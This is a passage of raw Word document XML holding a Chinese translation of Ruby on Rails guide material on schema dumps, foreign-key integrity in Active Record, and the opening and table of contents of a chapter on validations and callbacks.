          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>这个工具。用MySQL的话，则是各个数据表的+SHOW CREATE TABLE+输出结果。载入这些schema只不过是执行了文件里面的SQL语句而已。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7521B27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虽然用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:sql</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方式可以完美地复制数据库结构，不过如果换一个不同的数据库系统那就往往 没办法将schema写入新的数据库了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C93ECD"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6.3 导出数据库纲要(Schema)以及版本控制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7B0CC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因为schema dumps是数据库结构的精确来源，这么重要的东西，强烈建议你把它加入到版本 控制系统内。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA5DAA6"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7 Active Record 与 Referential Integrity(参照完整性)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C2008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所谓的 Active Record 之道，认为有头脑的应该是 models ，而不是数据库。因此，像是触发器 （triggers）或外键约束(foreign key constraints)这类偏向数据库功能，在 Rails 中就 比较不常使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489AF5F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在 model里面要确保数据库完整性，可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>validates :foreign_key, :uniqueness =&gt; true</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来做验证。Model里面，数据库关联(associations)上有个</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的选项，可以设定 成当父对象删除(destroy)的时候，自动连其子对象也一起删除。不过就像其他应用程式层级 操作的东西一样，这并不能保证数据表之间的参照完整性，所以有些人用外键约束来增进 这个功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD9C92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关于外建约束的功能，Active Record 并没有提供可以直接编辑它的工具，不过还是可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>execute</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法来执行任意的 SQL。也有不少的插件，可以帮 Active Record 加上外键的支持 （还可以把外键的设定全部显示在 db/schema.rb），像是这个"foreigner":https://github.com/matthuhiggins/foreigner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D07F779" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="005D6D6E" w:rsidRDefault="002A2B82" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65ADD045" w14:textId="45A0D2EE" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002B5D47" w:rsidP="009349BF">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>2.2、</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Active Record 校验与回调</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581BD5E2"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本章节将指导你如何将代码逻辑和 Active Record 的生命周期相关联。你将学习如何在数据保存到数据库前对其进行校验，以及如何在 Active Record 对象生命周期的特定时刻进行定制化操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE931B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阅读完本章节并理解相关概念后，希望你能够：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13261C6B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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理解 Active Record 对象的生命周期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381CF8E8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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使用 Active Record 内建的校验(Validation)helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A85B36C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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定制自己的校验方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06411998" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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获取和使用校验产生的错误信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7F8A27" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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创建回调(Callback)方法来响应 Active Record 对象生命周期中的事件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E3BAE8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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创建特殊的类用来封装回调的共同行为</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10862DBA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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创建</w:t>
      </w:r>
      <w:r w:rsidRPr="006348B9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>观察者</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="006348B9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Observers</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)来</w:t>
      </w:r>
      <w:r w:rsidRPr="006348B9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>在模型类外响应生命周期中的事件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0694EB13"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目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0AFBB7"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30" w:anchor="1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>对象的生命周期</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="32675DB8"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31" w:anchor="2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>校验的概述</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="42832533"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32" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>为什么需要校验？</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C36E8B3"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33" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>校验发生在什么时候？</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2189E655"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34" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>跳过校验</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="42561369"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35" w:anchor="2-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>valid?</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 和 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>invalid?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7B337663"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36" w:anchor="validations_overview-errors" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>errors[]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0051AC9B"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37" w:anchor="3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Validation Helpers</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="58575481"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38" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>acceptance</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2951BA6C"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39" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>validates_associated</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F699621"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40" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>confirmation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="50B1421C"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41" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>exclusion</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B420902"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42" w:anchor="3-5" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>format</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6F606D96"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43" w:anchor="3-6" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>inclusion</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="615907DB"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44" w:anchor="3-7" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>length</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2F8F39D8"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45" w:anchor="3-8" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>numericality</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="24AAF2C8"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46" w:anchor="3-9" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>presence</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4D3097EE"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47" w:anchor="3-10" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>uniqueness</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5C4164EB"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48" w:anchor="3-11" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>validates_with</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="53C974F2"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49" w:anchor="3-12" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>validates_each</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="72983F21"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50" w:anchor="4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>常用校验选项</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="55BABF4F"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51" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:allow_nil</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="784A304F"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52" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:allow_blank</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="512C3525"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53" w:anchor="4-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:message</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="27FF9C64"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54" w:anchor="4-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:on</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="141F7AE7"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55" w:anchor="5" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>严格校验</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="16BAA9D7"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56" w:anchor="6" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>有条件的校验</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1212603F"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57" w:anchor="6-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">使用 Symbol 作为 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:if</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 和 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:unless</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 的参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6602FAC5"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58" w:anchor="6-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">使用 String 作为 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:if</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 和 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:unless</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 的参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B5B4603"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59" w:anchor="6-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
